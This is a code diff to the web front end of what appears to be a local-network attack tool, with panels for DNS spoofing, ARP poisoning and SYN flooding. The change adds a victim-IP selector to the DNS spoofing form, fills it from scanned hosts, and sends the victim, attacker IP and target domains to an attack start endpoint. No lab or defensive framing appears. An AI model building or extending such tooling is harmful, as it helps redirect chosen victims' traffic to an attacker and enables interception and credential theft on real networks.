@@ -108,7 +108,11 @@
             <h3>🌐 DNS Spoofing (Domain Hijacking)</h3>
             <div class="form-grid">
                 <div class="form-group">
-                    <label>Attacker IP (redirect to)</label>
+                    <label>Victim IP (target machine)</label>
+                    <select id="dns-victim-ip"></select>
+                </div>
+                <div class="form-group">
+                    <label>Redirect To (attacker IP)</label>
                     <input type="text" id="dns-attacker-ip" value="{{ local_ip }}" placeholder="Your IP" />
                 </div>
                 <div class="form-group">
@@ -396,10 +400,16 @@
     let currentDNSAttackId = null;
 
     async function startDNSAttack() {
+        const victimIp = document.getElementById('dns-victim-ip').value;
         const attackerIp = document.getElementById('dns-attacker-ip').value;
         const domainsStr = document.getElementById('dns-domains').value || 'google.com';
         const domains = domainsStr.split(',').map(d => d.trim()).filter(d => d);
         const iface = document.getElementById('dns-interface').value || '';
+
+        if (!victimIp) {
+            alert('Select victim IP!');
+            return;
+        }
 
         if (!attackerIp) {
             alert('Enter attacker IP!');
@@ -412,12 +422,13 @@
         }
 
         const payload = {
+            victim_ip: victimIp,
             attacker_ip: attackerIp,
             target_domains: domains,
             interface: iface || null
         };
 
-        showStatus('dns-status', `🌐 Starting DNS spoof: ${domains.join(', ')} → ${attackerIp}...`, 'info');
+        showStatus('dns-status', `🌐 Starting DNS spoof: ${victimIp} → ${domains.join(', ')} redirects to ${attackerIp}...`, 'info');
 
         try {
             const res = await fetch('/api/attack/dns/start', {
@@ -723,7 +734,8 @@
         const victimSelect = document.getElementById('arp-victim-select');
         const gwSelect = document.getElementById('arp-gw-select');
         const synSelect = document.getElementById('syn-targets');
-        [victimSelect, gwSelect, synSelect].forEach(sel => { if (sel) sel.innerHTML = ''; });
+        const dnsVictimSelect = document.getElementById('dns-victim-ip');
+        [victimSelect, gwSelect, synSelect, dnsVictimSelect].forEach(sel => { if (sel) sel.innerHTML = ''; });
 
         scannedHosts.forEach(h => {
             // Create better label for dropdown
@@ -743,6 +755,9 @@
             }
             if (synSelect) {
                 const o3 = document.createElement('option'); o3.value = value; o3.textContent = label; synSelect.appendChild(o3);
+            }
+            if (dnsVictimSelect) {
+                const o4 = document.createElement('option'); o4.value = h.ip; o4.textContent = label; dnsVictimSelect.appendChild(o4);
             }
         });
 
